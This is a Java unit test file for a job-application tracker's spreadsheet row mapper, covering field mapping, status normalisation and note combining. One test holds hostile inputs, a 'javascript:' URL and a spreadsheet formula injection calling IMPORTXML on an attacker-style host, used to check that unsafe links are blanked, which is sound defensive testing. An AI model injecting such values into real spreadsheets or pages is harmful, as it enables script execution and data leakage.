package com.cvmaker.application.management.sheets;

import static org.assertj.core.api.Assertions.assertThat;

import java.time.LocalDateTime;
import java.util.List;

import org.junit.jupiter.api.Test;

import com.cvmaker.application.management.JobApplicationData;

class SheetRowMapperTest {

    private static final LocalDateTime NOW = LocalDateTime.of(2025, 11, 12, 9, 30, 15);

    private static Object cell(List<Object> row, SheetColumn column) {
        return row.get(column.index());
    }

    private static JobApplicationData fullJob() {
        JobApplicationData job = new JobApplicationData("msg-1", "Your application", "jobs@acme.example",
                "Tue, 11 Nov 2025 10:22:33 +0000 (UTC)");
        job.setCompanyName("Acme");
        job.setPositionTitle("QA Lead");
        job.setApplicationStatus("Interview Scheduled");
        job.setProvider("LinkedIn");
        job.setApplicationUrl("https://acme.example/jobs/1");
        job.setExtractedInfo("Call with the hiring manager");
        job.setContactEmail("hr@acme.example");
        job.setWorkLocation("Remote");
        job.setInterviewDate("2025-11-20");
        job.setWorkType("Full-time");
        job.setSalaryRange("£60k-£70k");
        job.setContactPerson("Dana");
        job.setNextSteps("Prepare a demo");
        job.setApplicationDeadline("30 Nov");
        job.setRequiredSkills("Java, SQL");
        job.setRejectionReason(null);
        job.setOfferDetails(null);
        job.setEmailTimestamp("2025-11-11T10:22:33");
        return job;
    }

    @Test
    void headerRowHasOneCellPerColumnInOrder() {
        List<Object> header = SheetRowMapper.headerRow();

        assertThat(header).hasSize(SheetColumn.count());
        assertThat(header).startsWith("Company", "Position", "Date Applied", "Status", "Provider", "Email Link",
                "Application URL", "Notes");
        assertThat(header).endsWith("Last Updated", "Email Timestamp");
    }

    @Test
    void mapsEveryFieldToItsColumn() {
        List<Object> row = SheetRowMapper.toRow(fullJob(), NOW);

        assertThat(row).hasSize(SheetColumn.count()).doesNotContainNull();
        assertThat(cell(row, SheetColumn.COMPANY)).isEqualTo("Acme");
        assertThat(cell(row, SheetColumn.POSITION)).isEqualTo("QA Lead");
        assertThat(cell(row, SheetColumn.DATE_APPLIED)).isEqualTo("11/11/2025");
        assertThat(cell(row, SheetColumn.STATUS)).isEqualTo("Interview");
        assertThat(cell(row, SheetColumn.PROVIDER)).isEqualTo("LinkedIn");
        assertThat(cell(row, SheetColumn.EMAIL_LINK)).isEqualTo("View Email");
        assertThat(cell(row, SheetColumn.APPLICATION_URL)).isEqualTo("Apply");
        assertThat(cell(row, SheetColumn.NOTES))
                .isEqualTo("Call with the hiring manager | 💰 £60k-£70k | 👤 Dana | ➡️ Prepare a demo | 🔧 Java, SQL");
        assertThat(cell(row, SheetColumn.CONTACT_EMAIL)).isEqualTo("hr@acme.example");
        assertThat(cell(row, SheetColumn.WORK_LOCATION)).isEqualTo("Remote");
        assertThat(cell(row, SheetColumn.INTERVIEW_DATE)).isEqualTo("20/11/2025");
        assertThat(cell(row, SheetColumn.WORK_TYPE)).isEqualTo("Full-time");
        assertThat(cell(row, SheetColumn.SALARY_RANGE)).isEqualTo("£60k-£70k");
        assertThat(cell(row, SheetColumn.CONTACT_PERSON)).isEqualTo("Dana");
        assertThat(cell(row, SheetColumn.NEXT_STEPS)).isEqualTo("Prepare a demo");
        assertThat(cell(row, SheetColumn.EMAIL_ID)).isEqualTo("msg-1");
        assertThat(cell(row, SheetColumn.DEADLINE)).isEqualTo("30 Nov");
        assertThat(cell(row, SheetColumn.SKILLS)).isEqualTo("Java, SQL");
        assertThat(cell(row, SheetColumn.REJECTION_REASON)).isEqualTo("");
        assertThat(cell(row, SheetColumn.OFFER_DETAILS)).isEqualTo("");
        assertThat(cell(row, SheetColumn.LAST_UPDATED)).isEqualTo("2025-11-12T09:30:15");
        assertThat(cell(row, SheetColumn.EMAIL_TIMESTAMP)).isEqualTo("2025-11-11T10:22:33");
    }

    @Test
    void emptyApplicationGivesDefaultsAndNoNulls() {
        List<Object> row = SheetRowMapper.toRow(new JobApplicationData(), NOW);

        assertThat(row).hasSize(SheetColumn.count()).doesNotContainNull();
        assertThat(cell(row, SheetColumn.COMPANY)).isEqualTo("");
        assertThat(cell(row, SheetColumn.STATUS)).isEqualTo("Applied");
        assertThat(cell(row, SheetColumn.DATE_APPLIED)).isEqualTo("");
        assertThat(cell(row, SheetColumn.EMAIL_ID)).isEqualTo("");
        assertThat(cell(row, SheetColumn.EMAIL_LINK)).isEqualTo("");
        assertThat(cell(row, SheetColumn.APPLICATION_URL)).isEqualTo("");
        assertThat(cell(row, SheetColumn.NOTES)).isEqualTo("");
        assertThat(cell(row, SheetColumn.LAST_UPDATED)).isEqualTo("2025-11-12T09:30:15");
        assertThat(cell(row, SheetColumn.EMAIL_TIMESTAMP)).isEqualTo("2025-11-12T09:30:15");
    }

    @Test
    void linkCellsStayEmptyWhenTheUrlIsNotSafe() {
        JobApplicationData job = fullJob();
        job.setApplicationUrl("javascript:alert(1)");
        job.setEmailLink("\"&IMPORTXML(\"https://evil.example\",\"//a\")&\"");

        List<Object> row = SheetRowMapper.toRow(job, NOW);

        assertThat(cell(row, SheetColumn.APPLICATION_URL)).isEqualTo("");
        assertThat(cell(row, SheetColumn.EMAIL_LINK)).isEqualTo("");
    }

    @Test
    void statusCellUsesOneSpellingPerStatus() {
        assertThat(SheetRowMapper.statusText("Offer")).isEqualTo("Offered");
        assertThat(SheetRowMapper.statusText("OFFERED")).isEqualTo("Offered");
        assertThat(SheetRowMapper.statusText("Interview Scheduled")).isEqualTo("Interview");
        assertThat(SheetRowMapper.statusText("not selected")).isEqualTo("Rejected");
        assertThat(SheetRowMapper.statusText(" On hold ")).isEqualTo("On hold");
        assertThat(SheetRowMapper.statusText(null)).isEqualTo("Applied");
        assertThat(SheetRowMapper.statusText("  ")).isEqualTo("Applied");
    }

    @Test
    void rejectionWordedDifferentlyStillLeadsTheNotes() {
        JobApplicationData job = new JobApplicationData();
        job.setApplicationStatus("Application unsuccessful");
        job.setRejectionReason("Role withdrawn");

        assertThat(SheetRowMapper.combineNotes(job)).isEqualTo("❌ REJECTED: Role withdrawn");
    }

    @Test
    void unparsedDateTextIsKept() {
        JobApplicationData job = fullJob();
        job.setInterviewDate("next Tuesday, 2pm");

        assertThat(cell(SheetRowMapper.toRow(job, NOW), SheetColumn.INTERVIEW_DATE)).isEqualTo("next Tuesday, 2pm");
    }

    @Test
    void notesKeepTheirOrder() {
        JobApplicationData job = new JobApplicationData();
        job.setApplicationStatus("Offered");
        job.setRequiredSkills(" Java ");
        job.setOfferDetails("Start in January");
        job.setRejectionReason("Earlier role was filled");
        job.setNextSteps("Sign the contract");
        job.setContactPerson("Dana");
        job.setSalaryRange("£70k");
        job.setExtractedInfo("Offer letter attached");

        assertThat(SheetRowMapper.combineNotes(job)).isEqualTo(
                "Offer letter attached | 💰 £70k | 👤 Dana | ➡️ Sign the contract"
                + " | ❌ Earlier role was filled | 🎉 Start in January | 🔧 Java");
    }

    @Test
    void rejectionReasonLeadsTheNotesOfARejectedApplication() {
        JobApplicationData job = new JobApplicationData();
        job.setApplicationStatus(" rejected ");
        job.setRejectionReason("Position filled internally");
        job.setExtractedInfo("Thanks for applying");
        job.setSalaryRange("£50k");

        assertThat(SheetRowMapper.combineNotes(job))
                .isEqualTo("❌ REJECTED: Position filled internally | Thanks for applying | 💰 £50k");
    }

    @Test
    void notesSkipBlankPartsAndCanBeEmpty() {
        JobApplicationData job = new JobApplicationData();
        job.setExtractedInfo("   ");
        job.setSalaryRange("");
        job.setContactPerson("Dana");

        assertThat(SheetRowMapper.combineNotes(job)).isEqualTo("👤 Dana");
        assertThat(SheetRowMapper.combineNotes(new JobApplicationData())).isEmpty();
    }
}
